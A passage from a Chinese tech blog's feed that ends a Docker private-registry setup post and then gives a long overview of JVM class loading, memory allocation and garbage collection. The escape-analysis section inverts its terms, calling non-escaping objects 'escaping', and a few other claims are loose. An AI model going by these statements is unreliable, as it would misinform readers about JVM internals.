class=&quot;line&quot;&gt;$ docker-compose --version&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sudo curl \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -L https://raw.githubusercontent.com/docker/compose/1.29.2/contrib/completion/bash/docker-compose \&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    -o /etc/bash_completion.d/docker-compose&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h1 id=&quot;安装docker私库&quot;&gt;&lt;a href=&quot;#安装docker私库&quot; class=&quot;headerlink&quot; title=&quot;安装docker私库&quot;&gt;&lt;/a&gt;安装docker私库&lt;/h1&gt;&lt;p&gt;为了使服务一次打包多次部署，需要安装docker私库来保存镜像&lt;/p&gt;
&lt;p&gt;首先建好映射目录的文件夹：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mkdir /data/registry&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;执行docker命令启动私库镜像：&lt;/p&gt;
&lt;figure class=&quot;highlight docker&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker &lt;span class=&quot;keyword&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; -itd -v /data/registry:/var/lib/registry -p 5000:5000 --restart=always --name registry registry:latest　&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;添加docker配置：&lt;/p&gt;
&lt;p&gt;注意：如果是通过内网访问就配内网IP否则 配公网IP&lt;/p&gt;
&lt;p&gt;&lt;code&gt;vi /etc/docker/daemon.json&lt;/code&gt;&lt;br&gt;添加如下：&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&amp;quot;insecure-registries&amp;quot;: [&amp;quot;192.168.2.200:5000&amp;quot;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;如果需要设置账号密码：&lt;/p&gt;
&lt;figure class=&quot;highlight docker&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;docker &lt;span class=&quot;keyword&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;bash&quot;&gt; --rm --entrypoint htpasswd  httpd:2 -Bbn yourUserName yourPwd &amp;gt;&amp;gt; ./auth/htpasswd  &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;一般在内网环境部署私库，拉取推送也是全程内网，所以可装可不装&lt;/p&gt;
&lt;p&gt;默认私库无法删除镜像，执行如下命令添加配置：&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sudo docker exec -it registry /bin/sh&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;cd /etc/docker/registry&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;vi config.yml&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;加入&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  delete:                                                                                                                                                                          &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    # To allow image delete                                                                                                                                                        &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    enabled: true &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="运维" scheme="https://reiner.host/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
    <category term="-- 运维 -- jenkins -- 自动化部署 -- docker" scheme="https://reiner.host/tags/%E8%BF%90%E7%BB%B4-jenkins-%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2-docker/"/>
    
  </entry>
  
  <entry>
    <title>JVM知识体系整合</title>
    <link href="https://reiner.host/posts/d137c087.html"/>
    <id>https://reiner.host/posts/d137c087.html</id>
    <published>2022-10-05T10:26:51.000Z</published>
    <updated>2022-10-05T12:25:09.361Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="前言">前言</span></h1><p>网上的资料比较杂，且少有成体系的资料，因此收集资料并按照自己的理解做了一下整合，本文为自我理解与总结，不代表标准答案。</p><h2><span id="从hello-world开始">从hello world开始</span></h2><p>java从编写’System.out.println(“hello world”)’ 开始，并编译运行，在这期间到底发生了什么。</p><h3><span id="java文件从编译到结束全过程类加载过程">.java文件从编译到结束全过程（类加载过程）</span></h3><p>一个.java文件的完整周期是 java编码成jvm可识别的.class文件， 然后大致流程是： 加载–&gt;连接–&gt;初始化–&gt;使用–&gt;卸载</p><h4><span id="1-加载过程">1. 加载过程</span></h4><p> 1、通过全类名获取定义此类的二进制字节流（类似反射）<br> 2、将字节流所代表的静态存储结构转换为JVM方法区的运行时数据结构<br> 3、在内存中生成一个代表该类的 java.lang.Class 对象，作为方法区这些数据的访问入口(这样代码才能通过全类名访问到该对象)<br> PS:数组类型不通过类加载器创建，它由JAVA虚拟机直接创建，数组的加载可通过自定义类加载器控制加载方式</p><h5><span id="11-加载过程中所需要的类加载器">1.1 加载过程中所需要的类加载器</span></h5><p>JVM中有三个类加载器，除了 BootstrapClassLoader 其他类加载器均由 Java 实现且全部继承自java.lang.ClassLoader</p><p>1、BootstrapClassLoader(启动类加载器) ：最顶层的加载类，由 C++实现，负责加载 %JAVA_HOME%/lib目录下的 jar 包和类或者被 -Xbootclasspath参数指定的路径中的所有类。<br>2、ExtensionClassLoader(扩展类加载器) ：主要负责加载 %JRE_HOME%/lib/ext 目录下的 jar 包和类，或被 java.ext.dirs 系统变量所指定的路径下的 jar 包。<br>3、AppClassLoader(应用程序类加载器) ：面向我们用户的加载器，负责加载当前应用 classpath 下的所有 jar 包和类。</p><span id="more"></span><h6><span id="12-类加载器的模型设计双亲委派模型">1.2 类加载器的模型设计（双亲委派模型）</span></h6><p>每一个类都有一个对应它的类加载器，在加载类时系统会先判断该类是否已经被加载过，如加载过则直接返回，否则才尝试加载，加载时会首先调用父类的loadClass()方法，当父类加载器无法处理时，才由自己来处理。</p><p>举例： 自定义加载器（判断该类是否加载过，未加载过，委托上级处理)  –&gt; AppClassLoader(应用程序类加载器，同样判断是否加载过，未加载则委托上级处理)  —&gt;   ExtensionClassLoader –&gt;  BootstrapClassLoader</p><p>整个过程就是依次向上传递，（如上级无法处理）再依次向下传递</p><p>好处：<br>   1、双亲委派模型保证了 Java 程序的稳定运行，可以避免类的重复加载（JVM 区分不同类的方式不仅仅根据类名，相同的类文件被不同的类加载器加载产生的是两个不同的类）<br>   2、保证了 Java 的核心 API 不被篡改。如果没有使用双亲委派模型，而是每个类加载器加载自己的话就会出现一些问题，比如我们编写一个称为 java.lang.Object 类的话，那么程序运行的时候，系统就会出现多个不同的 Object 类（即系统无法区分是jdk自带的Object对象还是用户自建的Object对象）。</p><p>自定义类加载器：继承 ClassLoader</p><h4><span id="2-类加载验证过程">2. 类加载验证过程</span></h4><p> 1、文件格式验证，验证是否符合class文件规范，版本号是否支持，常量池中常量是否有不支持的类型<br> 2、元数据验证，对字节码语义进行分析，以保存其符合java语言规范要求，例如：此类是否有父类（java.langObject除外），是否继承了被final 修饰的类等等。<br> 3、字节码验证，比较复杂的一个阶段，会对类的方法体逻辑进行验证，例如类型转换是否有效，字节码指令跳转异常等。<br> 4、符号引用验证，验证符号引用等否找到对应类，类权限是否能被引用等。<br> 总结：验证编译后的代码是否合法，是否能正常运行</p><h4><span id="3-类加载准备">3. 类加载准备</span></h4><p>准备阶段是正式为类变量分配内存并设置类变量初始值的阶段，* 这个时候进行内存分配的仅包括类变量（静态变量） * ，这里初始化变量值是数据类型的零值，不是实际值，如果是final修饰，则直接赋予实际值</p><h4><span id="4-解析阶段">4. 解析阶段</span></h4><p>解析阶段时将java虚拟机中变量池中的符号引用替换为直接引用的过程。简单来说就是把类名限定转换为实际内存中的Class对象引用。<br>JAVA虚拟机为每个类都准备了一张方法表来存储方法的地址，当需要调用某个类时只需要知道这个方法的位置即可，通过解析操作符号引用就可以直接转变为目标方法在类中方法表的位置<br>总结：java通过全类名获得类对象，通过解析操作</p><h4><span id="5-初始化阶段">5. 初始化阶段</span></h4><p>初始化阶段是执行初始化方法 <clinit> ()方法的过程，<clinit> ()方法是编译之后自动生成的。</clinit></clinit></p><p>1、初始化一个类，如果其父类还未初始化，则先触发该父类的初始化。<br>2、只有主动去使用类才会初始化类（也就是NEW对象的时候）<br>3、虚拟机启动时会先初始化Main方法这个类<br>4、……</p><h4><span id="6-内存如何分配">6. 内存如何分配</span></h4><p>当类被加载完毕后如何分配内存？</p><p>虚拟机执行到new对象指令时才开始加载类并分配内存，其流程为：类加载检查 –&gt; 判断是否已加载类(未加载类，则先加载类) –&gt; 已加载类，开始分配内存 –&gt; 执行初始化 –&gt; 设置对象头 –&gt; 执行init方法。 </p><h5><span id="61-类加载检查">6.1. 类加载检查</span></h5><p>当主动使用一个类（new 一个对象）时，首先去检查这个指令的参数是否能在常量池中定位到一个类的符号引用，并且检查这个符号引用代表的类是否已经被加载、解析和初始化过（也就是检查类是否已经被加载过）。如果没有，那必须先执行相应的类加载流程。</p><h5><span id="62-开始分配内存">6.2. 开始分配内存</span></h5><p>如果未被加载过，则在类加载检查通过后，接下来虚拟机将为新生对象分配内存，分配方式有 “指针碰撞” 和 “空闲列表” 两种，选择哪种分配方式由 Java 堆是否规整决定，而 Java 堆是否规整又由所采用的垃圾收集器是否带有压缩整理功能决定。</p><ul><li><p>指针碰撞 ：</p><ul><li>适用场合 ：堆内存规整（即没有内存碎片）的情况下。</li><li>原理 ：用过的内存全部整合到一边，没有用过的内存放在另一边，中间有一个分界指针，只需要向着没用过的内存方向将该指针移动对象内存大小位置即可。</li><li>使用该分配方式的 GC 收集器：Serial, ParNew</li></ul></li><li><p>空闲列表 ：</p><ul><li>适用场合 ： 堆内存不规整的情况下。</li><li>原理 ：虚拟机会维护一个列表，该列表中会记录哪些内存块是可用的，在分配的时候，找一块儿足够大的内存块儿来划分给对象实例，最后更新列表记录。</li><li>使用该分配方式的 GC 收集器：CMS</li></ul></li></ul><p>选择以上两种方式中的哪一种，取决于 Java 堆内存是否规整。而 Java 堆内存是否规整，取决于 GC 收集器的算法是”标记-清除”，还是”标记-整理”（也称作”标记-压缩”），值得注意的是，复制算法内存也是规整的。</p><p>PS:默认对象分配在Eden区，大对象直接分配在老年代</p><p><strong>内存分配并发问题</strong></p><p>虚拟机采用两种方式来保证线程安全：</p><ul><li>CAS+失败重试： CAS 是乐观锁的一种实现方式。所谓乐观锁就是，每次不加锁而是假设没有冲突而去完成某项操作，如果因为冲突失败就重试，直到成功为止。虚拟机采用 CAS 配上失败重试的方式保证更新操作的原子性。</li><li>TLAB： 为每一个线程预先在 Eden 区分配一块内存，JVM 在给线程中的对象分配内存时，首先在 TLAB 分配，当对象大于 TLAB 中的剩余内存或 TLAB 的内存已用尽时，再采用上述的 CAS 进行内存分配</li></ul><p><strong>也就是说每个线程都会在堆的Eden区预先分配一块内存给对象使用，当不够用时再使用乐观锁竞争分配来保证操作的原子性。</strong></p><h5><span id="63-初始化零值">6.3. 初始化零值</span></h5><p>内存分配完成后，虚拟机需要将分配到的内存空间都初始化为零值（不包括对象头），这一步操作保证了对象的实例字段在 Java 代码中可以不赋初始值就直接使用，程序能访问到这些字段的数据类型所对应的零值。</p><h5><span id="64-设置对象头">6.4. 设置对象头</span></h5><p>初始化零值完成之后，虚拟机要对对象进行必要的设置，例如这个对象是哪个类的实例、如何才能找到类的元数据信息、对象的哈希码、对象的 GC 分代年龄等信息。 这些信息存放在对象头中。 另外，根据虚拟机当前运行状态的不同，如是否启用偏向锁等，对象头会有不同的设置方式。</p><h5><span id="65-执行-init-方法">6.5. 执行 init 方法</span></h5><p>在上面工作都完成之后，从虚拟机的视角来看，一个新的对象已经产生了，但从 Java 程序的视角来看，对象创建才刚开始，<init> 方法还没有执行，所有的字段都还为零。所以一般来说，执行 new 指令之后会接着执行 <init> 方法，把对象按照程序员的意愿进行初始化，这样一个真正可用的对象才算完全产生出来。</init></init></p><h5><span id="66-对象的访问定位">6.6. 对象的访问定位</span></h5><p>建立对象就是为了使用对象，我们的 Java 程序通过栈上的 reference 数据来操作堆上的具体对象。对象的访问方式由虚拟机实现而定，目前主流的访问方式有：使用句柄、直接指针。</p><ul><li><p>句柄<br>如果使用句柄的话，那么 Java 堆中将会划分出一块内存来作为句柄池，reference 中存储的就是对象的句柄地址，而句柄中包含了对象实例数据与对象类型数据各自的具体地址信息。</p></li><li><p>直接指针<br>如果使用直接指针访问，reference 中存储的直接就是对象的地址。</p></li></ul><p><strong>简单来说就是当我们要使用一个类时JVM会通过这两种方式获取到对象，使用句柄的好处是中间隔了一层，对象被移动时只会改变句柄中的实例数据指针，而直接指针的优势就是速度快。</strong></p><h5><span id="67-逃逸分析">6.7. 逃逸分析</span></h5><p>一般情况下new出来的对象都是分配在堆上的，但在满足一定的条件，会先分配在栈上。</p><p>我们知道当堆空间不足时会触发FULL GC，而FULL GC会严重影响性能。 </p><p>有些对象其实是临时产生的，只在某个方法中使用，如果可以将这些对象随着栈的弹出而一同被销毁，那么就减轻了垃圾回收的压力。</p><p>为了减少临时对象在堆内分配的数量，JVM通过逃逸分析确定该对象会不会被外部访问。如果不会逃逸可以将该对象在栈上分配内存。随栈帧出栈而销毁，减轻GC的压力。</p><p><strong>什么是逃逸分析</strong></p><p>当创建的对象只在方法中使用，不被其它类所使用时则属于逃逸对象。如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> User <span class="title">test1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setId(<span class="number">1</span>);</span><br><span class="line">        user.setName(<span class="string">&quot;AA&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> user;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setId(<span class="number">2</span>);</span><br><span class="line">        user.setName(<span class="string">&quot;BB&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test1由于该对象返回了引用地址，有被外部使用，因此不属性逃逸对象，而test里的User并没有被其它任何地方使用，因此属于逃逸对象，可以将基分配在栈中。</p><p><strong>如何开启逃逸分析</strong></p><p>JDK7之后默认开启逃逸分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-XX:+DoEscapeAnalysis     开启逃逸分析</span><br><span class="line">-XX:-DoEscapeAnalysis         关闭逃逸分析  </span><br></pre></td></tr></table></figure><h5><span id="68-标量替换">6.8. 标量替换</span></h5><p>如果一个对象通过逃逸分析能过确定他可以在栈上分配，但是我们知道一个线程栈的空间默认也就1M，栈帧空间就更小了。而对象分配需要一块连续的空间，经过计算如果这个对象可以放在栈帧上，但是栈帧的空间不是连续的，</p><p>对于一个对象来说，这样是不行的，因为对象需要一块连续的空间。那怎么办呢？这时JVM做了一个优化，即便在栈帧中没有一块连续的空间方法下这个对象，他也能够通过其他的方式，让这个对象放到栈帧里面去，这个办法就是标量替换。</p><p>标量替换不是将整个User对象放到栈帧中，而是将User中的成员变量拿出来分别放在每一块空闲空间中。这种不是放一个完整的对象，而是将对象打散成一个个的成员变量放到栈帧上，当然会有一个地方标识这个属性是属于那个对象的，这就是标量替换.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-XX:+EliminateAllocations 开启标量替换</span><br></pre></td></tr></table></figure><p>JDK7之后默认开启。</p><h5><span id="69-标量替换与聚合量">6.9. 标量替换与聚合量</span></h5><p>标量替换与聚合量是逃逸分析中对变量或对象的定义。</p><p>JAVA的基本类型就属于标量，如：int,long等基本类型，对象属于可进一步分解的量，因此属于聚合量</p><h4><span id="7-卸载">7. 卸载</span></h4><p>卸载类需要满足 3 个要求:<br>1、该类的所有的实例对象都已被 GC，也就是说堆不存在该类的实例对象。<br>2、该类没有在其他任何地方被引用<br>3、该类的类加载器的实例已被 GC</p><h5><span id="71-什么情况下对象会被gc垃圾回收">7.1. 什么情况下对象会被GC（垃圾回收）</span></h5><p><em>堆中几乎放着所有的对象实例，对堆垃圾回收前的第一步就是要判断哪些对象已经死亡（即不能再被任何途径使用的对象）。</em></p><p>判断对象死亡的算法有两种：引用计数法和可达性分析算法。</p><ul><li>引用计数法</li></ul><p>给对象中添加一个引用计数器，每当有一个地方引用它，计数器就加 ，当引用失效，计数器就减 1，任何时候计数器为 0 的对象就是不可能再被使用的。</p><ul><li>可达性分析算法</li></ul><p>这个算法的基本思想就是通过一系列的称为 “GC Roots” 的对象作为起点，从这些节点开始向下搜索，节点所走过的路径称为引用链，当一个对象到 GC Roots 没有任何引用链相连的话，则证明此对象是不可用的，需要被回收。</p><p>哪些对象可以作为 GC Roots 呢？</p><p>虚拟机栈(栈帧中的本地变量表)中引用的对象<br>本地方法栈(Native 方法)中引用的对象<br>方法区中类静态属性引用的对象<br>方法区中常量引用的对象<br>所有被同步锁持有的对象<br>对象可以被回收，就代表一定会被回收吗？</p><p>即使在可达性分析法中不可达的对象，也并非是“非死不可”的，这时候它们暂时处于“缓刑阶段”，要真正宣告一个对象死亡，至少要经历两次标记过程；可达性分析法中不可达的对象被第一次标记并且进行一次筛选，筛选的条件是此对象是否有必要执行 finalize 方法。当对象没有覆盖 finalize 方法，或 finalize 方法已经被虚拟机调用过时，虚拟机将这两种情况视为没有必要执行。</p><p>被判定为需要执行的对象将会被放在一个队列中进行第二次标记，除非这个对象与引用链上的任何一个对象建立关联，否则就会被真的回收。</p><p><strong>判断对象死亡的算法总结</strong></p><p>引用计数法通过简单的计数判断，可达性分析算法通过引用链判断对象，不可达对象不一定会被回收，该对象会放在一个队列中进行第二次标记，除非这个对象与引用链上的任何一个对象建立关联，否则就会被真的回收。</p><p><strong>垃圾回收中的引用类型</strong></p><p>无论是通过引用计数法判断对象引用数量，还是通过可达性分析法判断对象的引用链是否可达，判定对象的存活都与“引用”有关。</p><ul><li>强引用（StrongReference）</li></ul><p>代码中直接new 出来的对象就属于强引用，JVM GC不会回收它，当内存空间不足的时候，java虚拟机宁可抛出OOM异常，也不会回收具有强引用的对象来释放内存。</p><ul><li>软引用（SoftReference）</li></ul><p>如果内存空间足够，垃圾回收器就不会回收它，如果内存空间不足了，就会回收这些对象的内存。只要垃圾回收器没有回收它，该对象就可以被程序使用。软引用可用来实现内存敏感的高速缓存。</p><p>定义一个软引用对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Object o=<span class="keyword">new</span> Object();</span><br><span class="line">SoftReference&lt;Object&gt; reference=<span class="keyword">new</span> SoftReference&lt;&gt;(o);</span><br><span class="line">System.out.println(o);</span><br><span class="line">System.out.println(reference.get());</span><br></pre></td></tr></table></figure><ul><li>弱引用（WeakReference）</li></ul><p>无论内存是否足够，只要发生GC 弱引用的对象一定被回收.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"> Object o=<span class="keyword">new</span> Object();</span><br><span class="line">WeakReference&lt;Object&gt; reference=<span class="keyword">new</span> WeakReference&lt;&gt;(o);</span><br><span class="line">System.out.println(o);</span><br><span class="line">System.out.println(reference.get());</span><br></pre></td></tr></table></figure><ul><li>虚引用（PhantomReference）</li></ul><p>“虚引用”顾名思义，就是形同虚设，与其他几种引用都不同，虚引用并不会决定对象的生命周期。如果一个对象仅持有虚引用，那么它就和没有任何引用一样，在任何时候都可能被垃圾回收。</p><p>虚引用主要用来跟踪对象被垃圾回收的活动。</p><p>虚引用与软引用和弱引用的一个区别在于： 虚引用必须和引用队列（ReferenceQueue）联合使用。当垃圾回收器准备回收一个对象时，如果发现它还有虚引用，就会在回收对象的内存之前，把这个虚引用加入到与之关联的引用队列中。程序可以通过判断引用队列中是否已经加入了虚引用，来了解被引用的对象是否将要被垃圾回收。程序如果发现某个虚引用已经被加入到引用队列，那么就可以在所引用的对象的内存被回收之前采取必要的行动。</p><p>特别注意，在程序设计中一般很少使用弱引用与虚引用，使用软引用的情况较多，这是因为软引用可以加速 JVM 对垃圾内存的回收速度，可以维护系统的运行安全，防止内存溢出（OutOfMemory）等问题的产生。</p><p><em>虚引用与引用队列</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Object o=<span class="keyword">new</span> Object();</span><br><span class="line">ReferenceQueue&lt;Object&gt; queue=<span class="keyword">new</span> ReferenceQueue();</span><br><span class="line">PhantomReference&lt;Object&gt; reference=<span class="keyword">new</span> PhantomReference&lt;&gt;(o,queue);</span><br><span class="line">System.out.println(o);</span><br><span class="line">System.out.println(reference.get());</span><br><span class="line">System.out.println(queue.poll());</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5><span id="72-垃圾收集算法">7.2. 垃圾收集算法</span></h5><p>标记-清除算法<br>该算法分为“标记”和“清除”阶段：首先标记出所有不需要回收的对象，在标记完成后统一回收掉所有没有被标记的对象。它是最基础的收集算法，后续的算法都是对其不足进行改进得到。这种垃圾收集算法会带来两个明显的问题：</p><p>效率问题<br>空间问题（标记清除后会产生大量不连续的碎片）</p><p>标记-复制算法<br>为了解决效率问题，“标记-复制”收集算法出现了。它可以将内存分为大小相同的两块，每次使用其中的一块。当这一块的内存使用完后，就将还存活的对象复制到另一块去，然后再把使用的空间一次清理掉。这样就使每次的内存回收都是对内存区间的一半进行回收。</p><p>复制算法</p><p>标记-整理算法<br>根据老年代的特点提出的一种标记算法，标记过程仍然与“标记-清除”算法一样，但后续步骤不是直接对可回收对象回收，而是让所有存活的对象向一端移动，然后直接清理掉端边界以外的内存。</p><p>标记-整理算法 </p><p>分代收集算法<br>当前虚拟机的垃圾收集都采用分代收集算法，这种算法没有什么新的思想，只是根据对象存活周期的不同将内存分为几块。一般将 java 堆分为新生代和老年代，这样我们就可以根据各个年代的特点选择合适的垃圾收集算法。</p><p>比如在新生代中，每次收集都会有大量对象死去，所以可以选择”标记-复制“算法，只需要付出少量对象的复制成本就可以完成每次垃圾收集。而老年代的对象存活几率是比较高的，而且没有额外的空间对它进行分配担保，所以我们必须选择“标记-清除”或“标记-整理”算法进行垃圾收集。</p><h5><span id="73-空间分配担保机制">7.3. 空间分配担保机制</span></h5><p>在发生Minor GC之前，虚拟机会检查老年代最大可用的连续空间是否大于新生代所有对象的总空间，</p><p>如果大于，则此次Minor GC是安全的</p><p>如果小于，则虚拟机会查看HandlePromotionFailure设置值是否允许担保失败。如果HandlePromotionFailure=true，那么会继续检查老年代最大可用连续空间是否大于历次晋升到老年代的对象的平均大小，如果大于，则尝试进行一次Minor GC，但这次Minor GC依然是有风险的；如果小于或者HandlePromotionFailure=false，则改为进行一次Full GC。</p><p><strong>空间分配担保是为了确保在 Minor GC 之前老年代本身还有容纳新生代所有对象的剩余空间。</strong></p><h5><span id="74-垃圾收集器">7.4. 垃圾收集器</span></h5><p>如果说收集算法是内存回收的方法论，那么垃圾收集器就是内存回收的具体实现。</p><p>JVM有许多垃圾收集器，每种收集器都对应了不同的使用场景，收集器列表如下：</p><ul><li>Serial 收集器</li><li>ParNew 收集器</li><li>Parallel Scavenge 收集器</li><li>Serial Old 收集器</li><li>Parallel Old 收集器</li><li>CMS 收集器</li><li>G1 收集器</li><li>ZGC 收集器</li></ul><p>下面是网上收集的各个垃圾收集器的具体介绍：</p><p>Serial 收集器<br>Serial（串行）收集器是最基本、历史最悠久的垃圾收集器了。大家看名字就知道这个收集器是一个单线程收集器了。它的 “单线程” 的意义不仅仅意味着它只会使用一条垃圾收集线程去完成垃圾收集工作，更重要的是它在进行垃圾收集工作的时候必须暂停其他所有的工作线程（ “Stop The World” ），直到它收集结束。</p><p>新生代采用标记-复制算法，老年代采用标记-整理算法。</p><p> Serial 收集器 </p><p>虚拟机的设计者们当然知道 Stop The World 带来的不良用户体验，所以在后续的垃圾收集器设计中停顿时间在不断缩短（仍然还有停顿，寻找最优秀的垃圾收集器的过程仍然在继续）。</p><p>但是 Serial 收集器有没有优于其他垃圾收集器的地方呢？当然有，它简单而高效（与其他收集器的单线程相比）。Serial 收集器由于没有线程交互的开销，自然可以获得很高的单线程收集效率。Serial 收集器对于运行在 Client 模式下的虚拟机来说是个不错的选择。</p><p>ParNew 收集器<br>ParNew 收集器其实就是 Serial 收集器的多线程版本，除了使用多线程进行垃圾收集外，其余行为（控制参数、收集算法、回收策略等等）和 Serial 收集器完全一样。</p><p>新生代采用标记-复制算法，老年代采用标记-整理算法。</p><p>ParNew 收集器 </p><p>它是许多运行在 Server 模式下的虚拟机的首要选择，除了 Serial 收集器外，只有它能与 CMS 收集器（真正意义上的并发收集器，后面会介绍到）配合工作。</p><p>并行和并发概念补充：</p><p>并行（Parallel） ：指多条垃圾收集线程并行工作，但此时用户线程仍然处于等待状态。</p><p>并发（Concurrent）：指用户线程与垃圾收集线程同时执行（但不一定是并行，可能会交替执行），用户程序在继续运行，而垃圾收集器运行在另一个 CPU 上。</p><p>Parallel Scavenge 收集器<br>Parallel Scavenge 收集器也是使用标记-复制算法的多线程收集器，它看上去几乎和 ParNew 都一样。 那么它有什么特别之处呢？</p><p>-XX:+UseParallelGC</p><pre><code>使用 Parallel 收集器+ 老年代串行</code></pre><p>-XX:+UseParallelOldGC</p><pre><code>使用 Parallel 收集器+ 老年代并行</code></pre><p>Parallel Scavenge 收集器关注点是吞吐量（高效率的利用 CPU）。CMS 等垃圾收集器的关注点更多的是用户线程的停顿时间（提高用户体验）。所谓吞吐量就是 CPU 中用于运行用户代码的时间与 CPU 总消耗时间的比值。 Parallel Scavenge 收集器提供了很多参数供用户找到最合适的停顿时间或最大吞吐量，如果对于收集器运作不太了解，手工优化存在困难的时候，使用 Parallel Scavenge 收集器配合自适应调节策略，把内存管理优化交给虚拟机去完成也是一个不错的选择。</p><p>新生代采用标记-复制算法，老年代采用标记-整理算法。</p><p>Parallel Scavenge 收集器 </p><p>这是 JDK1.8 默认收集器</p><p>使用 java -XX:+PrintCommandLineFlags -version 命令查看</p><p>-XX:InitialHeapSize=262921408 -XX:MaxHeapSize=4206742528 -XX:+PrintCommandLineFlags 